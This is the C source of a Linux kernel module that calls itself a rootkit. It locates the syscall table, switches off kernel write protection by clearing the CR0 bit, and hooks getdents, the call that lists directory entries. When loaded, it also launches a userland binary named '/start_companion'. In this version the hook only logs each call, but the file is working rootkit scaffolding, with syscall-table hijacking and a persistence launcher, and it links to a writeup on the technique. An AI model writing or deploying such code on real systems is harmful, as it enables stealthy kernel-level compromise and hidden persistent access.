#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>

static unsigned long *syscall_table = NULL;
static asmlinkage long (*original_call)(const struct pt_regs *);

static asmlinkage long myGetDents(const struct pt_regs *regs) {
    long ret = original_call(regs);
    printk(KERN_INFO "Syscall was called\n");
    return ret;
}


/* Current solution would be to allow kallsyms_lookup_name in our Kernel, for the moment, and they maybe disable it and see how we can still have the same behavior
 *
 *  https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
 * */

static unsigned long **find_sys_call_table(void) {
    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
}
//static unsigned long **find_sys_call_table(void) {
//    unsigned long offset = PAGE_OFFSET;
//    unsigned long **sct;
//
//    while (offset < ULLONG_MAX) {
//        sct = (unsigned long **)offset;
//        if (sct[__NR_close] == (unsigned long ) sys_close) 
//            return sct;
//        offset += sizeof(void *);
//    }
//    return NULL;
//}

static void overSyscall(unsigned long *syscall_table) {
    original_call = (void *)syscall_table[__NR_getdents];
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents] = (unsigned long)myGetDents;
    write_cr0(read_cr0() | 0x10000);
}
static int __init rootkit_init(void) {

   syscall_table = (unsigned long*)find_sys_call_table();
    if (!syscall_table) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return -1;
    }

    overSyscall(syscall_table);

    
    printk(KERN_INFO "Rootkit has been loaded\n");
    char *argv[] = {"/start_companion", NULL};
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk("%i\n", r);
    return 0;
}

static void rootkit_exit(void) {
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
